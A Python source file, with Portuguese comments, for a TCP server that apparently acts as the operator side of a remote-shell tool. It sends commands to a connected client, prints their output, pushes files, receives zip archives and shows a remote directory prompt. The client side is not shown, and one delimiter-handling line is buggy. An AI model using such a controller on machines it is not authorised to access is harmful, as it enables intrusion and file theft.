import socket
BYTES_SIZE = 5 * 1024
DELIMETER = '<END_OF_RESULT>'

class Server_Connection:
    def __init__(self, sock=None):
        # criando uma conexão TCP diretamente no construtor da classe
        if sock is None:
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        else:
            self.sock = sock
    def CreateConnection(self, ip="", port=5235):
        # deixando o servidor acessivel
        self.server_ip = ip
        self.server_port = port
        self.address = (self.server_ip, self.server_port)
        self.sock.bind(self.address)

    def Listen(self, backlog=5):
        self.sock.listen(backlog)

    def AcceptConnection(self):
        self.client_conn, self.client_address = self.sock.accept()
        print("\nconnection established with IP {} PORT {}\n".format(self.address[0], self.address[1]))
        return(self.client_conn, self.client_address)

    def send_data(self, user_input):
        user_input_bytes = bytes(user_input, "utf-8")
        self.client_conn.send(user_input_bytes)

    def receive_data(self):
        recv_bytes_data = self.client_conn.recv(BYTES_SIZE)
        self.data = recv_bytes_data.decode("utf-8")
        return self.data

    def receive_command(self):
        print('[+] Getting data...')
        result = b''
        while True:
            chunck = self.client_conn.recv(BYTES_SIZE)

            if chunck.endswith(DELIMETER.encode()):
                chunck += chunck[:-len(DELIMETER)]

                result += chunck
                break
            result += chunck
        print(result.decode())
    
    def send_file(self, filename):

        print('[+] Sending file...')
        with open(filename, 'rb') as file:
            chunck = file.read(BYTES_SIZE)

            while len(chunck) > 0:
                self.client_conn.send(chunck)
                chunck = file.read(BYTES_SIZE)
            self.client_conn.send(DELIMETER.encode())
    
    def receive_zip(self, zip_file):
        print('[+] Receving zip file...')

        full_zip_file = b''
        while True:
            chunck = self.client_conn.recv(BYTES_SIZE)
            if chunck.endswith(DELIMETER.encode()):
                chunck = chunck[:-len(DELIMETER)]
                full_zip_file += chunck
                break
            full_zip_file += chunck
        
        with open(zip_file, 'wb') as file:
            file.write(full_zip_file)
            file.close()
        print('[+] Downloaded successful')
    
    def change_dir(self):
        pwd = self.receive_data()

        while True:
            print('{} >>>'.format(pwd), end=' ')
            user_input = input('')
            self.send_data(user_input)
            if user_input == "":
                continue

            if user_input == 'stop':
                break
            pwd = self.receive_data()